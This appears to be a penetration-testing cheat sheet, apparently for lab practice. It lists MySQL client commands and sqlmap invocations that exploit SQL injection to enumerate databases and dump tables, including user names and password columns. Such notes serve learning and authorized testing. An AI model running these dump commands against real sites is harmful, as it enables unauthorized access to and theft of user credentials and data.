# MySQL

Connect to a MySQL server

```bash
# Local service
mysql -u acuity -pSuperStr00ng!

# Remote service
mysql -u acuity -p -h <IP> -P 3306
```

List all databases

```sql
show databases;
```

Select a database

```sql
use name_of_database;
```

List all tables in the active database

```sql
show tables;
```

List content of a table

```sql
# List all content
select * from name_of_table;

# Define a more specific selection
select username, password from users where username = 'HTB';
```

### SQLMap

An open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. [https://sqlmap.org/](https://sqlmap.org/)

#### Basic Data Enumeration

```bash
# Check version, user, db name and admin permissions
sqlmap -u "http://www.acuity.lab/?id=1" --banner --current-user --current-db --is-dba
```

#### Table Enumeration

```bash
# Dump everything from MySQL server (no system databases)
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs

# Dump everything from a specific database
sqlmap -u "http://www.example.com/?id=1" -D database --dump

# Enumerate all tables within the specified DB
sqlmap -u "http://www.example.com/?id=1" --tables -D database

# Dump all data from the specified table
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database

# Dump only specific columns from specified table
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database -C name,password

# Limit rows dumped by ordinal numbers
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database --start=2 --stop=3

# Dump data based on matched conditions
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database --where="name = 'acuity'"

# alternative
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D database --where="name LIKE 'acu%'"

```
